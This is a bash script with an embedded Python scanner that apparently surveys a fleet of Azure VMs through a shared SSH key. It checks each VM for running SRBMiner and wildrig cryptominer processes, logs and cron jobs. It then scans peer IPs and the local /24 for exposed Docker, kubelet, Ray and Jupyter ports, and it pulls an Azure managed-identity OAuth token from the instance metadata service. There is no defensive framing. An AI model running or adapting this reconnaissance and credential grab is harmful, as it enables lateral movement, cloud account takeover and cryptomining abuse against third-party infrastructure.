#!/bin/bash
# fleet sweep from inside Azure: reachability + miner evidence for every key-A VM
KEY=$PWD/az/ibm_key.pem; chmod 600 "$KEY"
echo "RUNNER=$(hostname)"; ip -4 -o addr | awk '{print "ADDR",$4}'; ip route | head -5
sweep() {
  name="$1"; ip="$2"; user="$3"
  if ! timeout 6 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null; then echo "### $name $ip PORT22-CLOSED"; return; fi
  res=$(ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
     -o ConnectTimeout=8 -o LogLevel=ERROR "$user@$ip" \
     'echo UID=$(id -u); echo HOST=$(hostname); nvidia-smi -L 2>/dev/null | head -8; echo PROC=$(pgrep -a SRBMiner | head -2 | tr "\n" ";")$(pgrep -a wildrig | head -2 | tr "\n" ";"); echo LOGS; for f in /opt/t19/logs/*.log /opt/t19/*.log; do [ -f "$f" ] && tail -n 2 "$f"; done 2>/dev/null | tail -6; echo CRON=$(crontab -l 2>/dev/null | grep -c .)' 2>&1)
  echo "### $name $ip"; echo "$res"
}
export -f sweep; export KEY
awk -F'\t' '{print $2"\t"$1"\t"$3}' az/hosts.tsv | xargs -P 12 -d '\n' -I{} bash -c 'IFS=$'"'"'\t'"'"' read ip name user <<< "{}"; sweep "$name" "$ip" "$user"'
echo "=== PEERS (UAMI VMs + runner-local /24) ==="
for ipp in 20.115.114.95 4.151.72.8 20.197.62.105; do
  for p in 22 3389 2375 2376 10250 6443 9400 8265 8888; do
    timeout 3 bash -c "echo > /dev/tcp/$ipp/$p" 2>/dev/null && echo "PEER-OPEN $ipp:$p"
  done
done
python3 - <<'PY'
import asyncio, ipaddress, socket
async def chk(ip,ports,sem):
    async with sem:
        for p in ports:
            try:
                r,w=await asyncio.wait_for(asyncio.open_connection(ip,p),0.7)
                print(f"SCAN-OPEN {ip}:{p}",flush=True); w.close()
            except: pass
async def main():
    # own /24 discovered from local addrs
    import subprocess,re
    outs=subprocess.run(['ip','-4','-o','addr'],capture_output=True,text=True).stdout
    nets=[ipaddress.ip_network(a,strict=False) for a in re.findall(r'inet (\d+\.\d+\.\d+\.\d+/\d+)',outs) if not a.startswith('127.')]
    sem=asyncio.Semaphore(400); t=[]
    for n in nets:
        print('SCANNING',n,flush=True)
        for h in list(n.hosts())[:256]:
            t.append(asyncio.create_task(chk(str(h),[22,2375,10250,9400,8265,8888],sem)))
    await asyncio.gather(*t)
asyncio.run(main())
PY
echo "=== IMDS ==="
curl -s -m 5 -H 'Metadata:true' 'http://169.254.169.254/metadata/instance/compute?api-version=2021-11-15' | head -c 400; echo
curl -s -m 5 -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 300; echo
